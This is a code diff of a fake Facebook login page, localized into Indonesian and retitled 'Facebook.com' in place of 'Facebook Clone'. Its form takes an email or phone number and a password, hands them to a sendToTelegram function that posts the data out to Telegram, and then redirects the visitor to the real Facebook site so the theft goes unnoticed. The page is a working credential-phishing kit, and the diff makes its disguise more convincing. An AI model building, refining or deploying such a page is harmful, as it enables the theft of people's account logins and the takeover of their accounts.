@@ -3,9 +3,165 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Facebook Clone</title>
+    <title>Facebook.com</title>
     <link rel="stylesheet" href="./css/styles.css">
     <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background-color: #f0f2f5;
+        }
+
+        .main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .heading-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .heading-section img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .a-ri8 {
+            font-size: 1.2em;
+            margin-top: 10px;
+            color: #606770;
+        }
+
+        .form {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .a-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .a-form input {
+            margin-bottom: 10px;
+            padding: 10px;
+            font-size: 1em;
+            border: 1px solid #dddfe2;
+            border-radius: 5px;
+        }
+
+        .a-form .a-sub,
+        .a-form .a-but {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            cursor: pointer;
+            padding: 12px;
+            font-size: 1em;
+            border-radius: 5px;
+        }
+
+        .a-form .a-sub:hover,
+        .a-form .a-but:hover {
+            background-color: #165cdb;
+        }
+
+        .a-link {
+            text-align: center;
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+        }
+
+        .a-hr {
+            border: none;
+            border-top: 1px solid #dddfe2;
+            margin: 20px 0;
+        }
+
+        .create-page {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .create-page .a-href {
+            color: #1877f2;
+        }
+
+        .footer {
+            background-color: #f7f7f7;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .footer ul {
+            list-style: none;
+            padding: 0;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .footer ul li {
+            margin: 5px 10px;
+        }
+
+        .footer ul li a {
+            text-decoration: none;
+            color: #1877f2;
+        }
+
+        .m-footer {
+            background-color: #f7f7f7;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .m-footer .main-c,
+        .m-footer .main-links,
+        .m-footer .fb {
+            margin: 10px 0;
+        }
+
+        .m-footer .list-1,
+        .m-footer .list-2 {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .m-footer .list-1 span,
+        .m-footer .list-2 span {
+            margin: 5px 10px;
+        }
+
+        @media (max-width: 600px) {
+            .a-ri8 {
+                font-size: 1em;
+            }
+
+            .form {
+                padding: 10px;
+            }
+
+            .a-form input {
+                font-size: 0.9em;
+            }
+        }
+    </style>
 </head>
 
 <body>
@@ -13,22 +169,22 @@
         <div class="main">
             <div class="heading-section">
                 <img src="./images/logo.png" class="logo-img">
-                <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
+                <div class="a-ri8"><span>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam hidup Anda.</span></div>
             </div>
 
             <div class="form">
                 <form class="a-form" onsubmit="sendToTelegram(event)">
-                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address or phone number"
+                    <input type="email" id="Email" class="a-email" name="Email" placeholder="Email address atau nomor telepon"
                         autofocus="autofocus" required />
                     <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password"
                         autofocus="autofocus" required />
                     <input type="submit" class="a-sub" value="Log In" />
-                    <a href="" class="a-link">Forgotten password?</a>
+                    <a href="" class="a-link">Lupa kata sandi?</a>
                     <hr class="a-hr">
-                    <input type="button" value="Create New Account" class="a-but" />
+                    <input type="button" value="Buat Akun Baru" class="a-but" />
                 </form>
                 <div class="create-page">
-                    <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
+                    <a href="" class="a-href">Buat Halaman</a></b> untuk selebriti, grup musik, atau bisnis.
                 </div>
             </div>
         </div>
@@ -42,55 +198,54 @@
                 <li><a href="">मराठी</a></li>
                 <li><a href="">اردو</a></li>
                 <li><a href="">മലയാളം</a></li>
-                <li><a href="">বাংলা</a> </li>
-                <li><a href="" class="_sv4">తెలుగు</a> </li>
+                <li><a href="">বাংলা</a></li>
+                <li><a href="" class="_sv4">తెలుగు</a></li>
                 <li><a href="" class="_sv4">தமிழ்</a></li>
                 <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
                 <li><a href="" class="_sv4">Español</a></li>
-                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
+                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a></li>
             </ul>
             <div id="line"></div>
             <div>
                 <ul>
-                    <li><a href="">Sign Up</a></li>
+                    <li><a href="">Daftar</a></li>
                     <li><a href="">Log In</a></li>
                     <li><a href="">Messenger</a></li>
-                    <li><a href="">Facebook Lite</a> </li>
-                    <li><a href=""> Watch </a> </li>
-                    <li><a href="">People</a> </li>
-                    <li><a href="">Pages</a></li>
-                    <li><a href="">Page categories</a></li>
-                    <li><a href="">Places</a></li>
-                    <li><a href="">Games</a></li>
-                    <li><a href="">Locations</a></li>
+                    <li><a href="">Facebook Lite</a></li>
+                    <li><a href="">Watch</a></li>
+                    <li><a href="">Orang</a></li>
+                    <li><a href="">Halaman</a></li>
+                    <li><a href="">Kategori Halaman</a></li>
+                    <li><a href="">Tempat</a></li>
+                    <li><a href="">Game</a></li>
+                    <li><a href="">Lokasi</a></li>
                     <li><a href="">Marketplace</a></li>
                     <li><a href="">Facebook Pay</a></li>
-                    <li><a href="">Groups</a></li>
-                    <li><a href="">Jobs</a></li>
+                    <li><a href="">Grup</a></li>
+                    <li><a href="">Pekerjaan</a></li>
                     <li><a href="">Oculus</a></li>
                     <li><a href="">Portal</a></li>
                     <li><a href="">Instagram</a></li>
-                    <li><a href="">Local</a></li>
-                    <li><a href="">Fundraisers</a></li>
-                    <li><a href="">Services</a></li>
-                    <li><a href="">Voting Information Centre</a></li>
-                    <li><a href="">About</a></li>
-                    <li><a href="">Create ad</a></li>
-                    <li><a href="">Create Page</a></li>
-                    <li><a href="">Developers</a></li>
-                    <li><a href="">Careers</a></li>
-                    <li><a href="">Privacy</a></li>
+                    <li><a href="">Lokal</a></li>
+                    <li><a href="">Penggalangan Dana</a></li>
+                    <li><a href="">Layanan</a></li>
+                    <li><a href="">Pusat Informasi Voting</a></li>
+                    <li><a href="">Tentang</a></li>
+                    <li><a href="">Buat Iklan</a></li>
+                    <li><a href="">Buat Halaman</a></li>
+                    <li><a href="">Pengembang</a></li>
+                    <li><a href="">Karir</a></li>
+                    <li><a href="">Privasi</a></li>
                     <li><a href="">Cookies</a></li>
                     <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
-                    <li><a href="">Terms</a></li>
-                    <li><a href="">Help</a></li>
-                    <li><a href="">Settings</a></li>
-                    <li><a href="">Activity log</a></li>
+                    <li><a href="">Ketentuan</a></li>
+                    <li><a href="">Bantuan</a></li>
+                    <li><a href="">Pengaturan</a></li>
+                    <li><a href="">Log Aktivitas</a></li>
                 </ul>
             </div>
             <div class="copyright">
-                <div><span> Facebook © 2021</span>
-                </div>
+                <div><span>Facebook © 2021</span></div>
             </div>
         </div>
     </div>
@@ -103,19 +258,17 @@
             </div>
             <div class="list-2">
                 <div><span><a href="">ગુજરાતી</a></span></div>
-                <div class=""><span><a href="">मराठी</a></span>
-                </div>
+                <div class=""><span><a href="">मराठी</a></span></div>
                 <div><span><a href="">മലയാളം</a></span></div>
                 <a>
-                    <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
-                    </div>
+                    <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i></div>
                 </a>
             </div>
         </div>
         <div class="main-links">
-            <span>About </span>.
-            <span> Help </span>.
-            <span> More </span>
+            <span>Tentang</span>.
+            <span>Bantuan</span>.
+            <span>Lainnya</span>
         </div>
         <div class="fb">Facebook Inc.</div>
     </div>
@@ -143,23 +296,20 @@
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    alert('Data sent to Telegram successfully!');
+                    alert('Data berhasil dikirim ke Telegram!');
                 } else {
-                    alert('Failed to send data to Telegram.');
+                    alert('Gagal mengirim data ke Telegram.');
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('Error sending data to Telegram.');
+                alert('Terjadi kesalahan saat mengirim data ke Telegram.');
             });
 
-
-            // Redirect to Facebook homepage after sending data
+            // Redirect ke halaman utama Facebook setelah mengirim data
             window.location.href = "https://www.facebook.com";
-
         }
     </script>
-
 </body>
 
 </html>
